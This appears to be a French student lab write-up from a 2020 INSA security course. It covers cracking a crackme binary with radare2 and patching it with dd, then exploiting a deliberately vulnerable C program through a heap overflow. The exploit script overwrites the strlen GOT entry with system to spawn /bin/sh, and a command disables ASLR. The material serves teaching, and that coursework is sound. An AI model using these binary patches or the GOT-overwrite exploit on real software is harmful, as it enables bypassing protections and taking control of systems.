# INSA 2SU 2020

https://bitbucket.org/whitewand/2su_2020/src

## Questions

## TD
### TD1

#### Crack emily

`file Td1.original 
Td1.original: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0456a9207dea8aeec6c747f074818b7b8b231b1d, not stripped`

On lance ensuite Radare2. On peut après l'analyse afficher les strings et les symboles.

![Main](./src/img/main.png)

On peut voir que la fonction main vérifie l'input avec la fonction is_valid:

![is_valid](./src/img/is_valid.png)

On peut extraire le mot de passe: **poop**. On peut voir différentes façons de patcher le binaire, en modifiant le mot de passe dans la section .data (offset: 0x984) ou en patchant le .text du programme. On peut Noped (0x90 opcode = no operation) le *je* (offset: 0x8c6) de main, le *jne* (offset: 0x861) de is valid, et change le mov 0 (offset: 0x86d) de is_valid en mov 1.

Petit script qui fait ca avec dd:

```
#!/bin/bash

echo "#Patching files";echo
cp Td1.original Td1_change_password
cp Td1.original Td1_main_nop_je
cp Td1.original Td1_is_valid_no_jne
cp Td1.original Td1_is_valid_change_mov

printf 'pwnd' | dd of=Td1_change_password bs=1 seek=2436 count=4 conv=notrunc
printf '\x90\x90' | dd of=Td1_main_nop_je bs=1 seek=2246 count=2 conv=notrunc
printf '\x90\x90' | dd of=Td1_is_valid_no_jne bs=1 seek=2145 count=2 conv=notrunc
printf '\x01' | dd of=Td1_is_valid_change_mov bs=1 seek=2157 count=1 conv=notrunc

echo "[+] testing";echo
echo "echo 'pwnd' | ./Td1_change_password"
echo 'pwnd' | ./Td1_change_password;echo
echo "echo 'random' | ./Td1_main_nop_je"
echo 'random' | ./Td1_main_nop_je;echo
echo "echo 'random' | ./Td1_is_valid_no_jne"
echo 'random' | ./Td1_is_valid_no_jne;echo
echo "echo 'random' | ./Td1_is_valid_change_mov"
echo 'random' | ./Td1_is_valid_change_mov;echo
```

résultat:

```
#Patching files

4+0 enregistrements lus
4+0 enregistrements écrits
4 bytes copied, 0,000147782 s, 27,1 kB/s
2+0 enregistrements lus
2+0 enregistrements écrits
2 bytes copied, 0,000114043 s, 17,5 kB/s
2+0 enregistrements lus
2+0 enregistrements écrits
2 bytes copied, 0,000120412 s, 16,6 kB/s
1+0 enregistrements lus
1+0 enregistrements écrits
1 byte copied, 0,000110696 s, 9,0 kB/s
[+] testing

echo 'pwnd' | ./Td1_change_password
Please input a word: That's correct!

echo 'random' | ./Td1_main_nop_je
Please input a word: That's correct!

echo 'random' | ./Td1_is_valid_no_jne
Please input a word: That's correct!

echo 'random' | ./Td1_is_valid_change_mov
Please input a word: That's correct!
```

#### Patch binaire

### TD2
#### Binwalk
### TD3
#### Heap overflow

Nous allons exploiter un binaire dont voici le code source:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct user {
 char * name;
};

int main(int argc, char **argv){

  struct user *bot;
  bot = (struct user*)malloc(sizeof(struct user*));
  bot->name = malloc(sizeof(char)*20);
  strcpy(bot->name, "botname\0");

  struct user *nick;
  nick = (struct user*)malloc(sizeof(struct user*));
  nick->name = malloc(sizeof(char)*20);
  strcpy(nick->name, "nickname\0");

  char buf[256];
  int size;

  //printf("0x%08x\n", printf);

  printf("Change botname?\n");
  memset(buf,0,256); 
  scanf("%s",buf);
  size = strlen(buf);
  strcpy(bot->name, buf);

  printf("Change nickname?\n");
  memset(buf,0,256); 
  scanf("%s",buf);
  strcpy(nick->name, buf);

  printf("Your message?\n");
  memset(buf,0,256); 
  scanf("%s",buf);
  size = strlen(buf);
  free(bot);
  //free(nick);
  printf("Message sent\n");
  return 0;
}
```

On peut voir que le programme run normalement

![basic](./src/img/firsrun.PNG)

Grâce à un heap overflow de la structure 'bot' nous allons pouvoir modifier l'adresse de la structure 'nick'. Ceci va nous donner une écriture arbitraire. Où pourrions nous écrire quelque chose d'interéssant? La Global offset table qui redirige vers les fonctions de la Glibc me parait une bonne cible. On pourrais par exemple remplacer l'adresse de 'strlen' par 'system' et executer '/bin/sh' à la place du message.

On peut calculer l'offset des fonctions

![func](./src/img/offset_func.PNG)

On peut voir l'adresse de strlen dans la GOT

Au premier appel on résoud l'adresse de strlen

![got](./src/img/strlengot1.PNG)

après la résolution on voit que ca pointe bien vers strlen

![got](./src/img/strlengot2.PNG)

exploit:

```
import sys
import struct
from pwn import *


pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755030) # adresse de strlen dans la GOT
s1 = pad + read_addr + "\n"

strlen = 0x7ffff7e7d710 # adresse de strlen dans la Glibc


# step 2 arbitrary writing
system = struct.pack("<Q", strlen-0x43720) # adresse de system de la Glibc par offset
s2 = system + "\n" + "/bin/sh\n"

sys.stdout.write(s1 + s2)
```

On peut compiler le programme simplement 

`gcc -o Chatbot chatbot.c`

Pour que cet exploit marche il faut désactiver l'ASLR qui va changer l'adresse de base de la Glibc à chaque execution.

`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

Si on avait une lecture arbitraire, on pourrait leaker une adresse de la Glibc et ainsi calculer l'offset de 'system' même avec la randomisation des adresses de la Glibc.

on obtient bien un shell:

![exploit](./src/img/exploit.PNG)

On peut voir ce qui se passe dans la heap:

avant la copy le heap overflow on voit l'adresse de bot et de nick qui pointe vers leurs chaine de caractère respectivement.

![got](./src/img/heap1.PNG)

ensuite après le heap overflow, on voit que l'adresse de nick pointe vers strlen@got:

![got](./src/img/heap2.PNG)

Si on regarde dans strlen@plt, on voit que ca pointe désormais vers system

![got](./src/img/strlengot3.PNG)
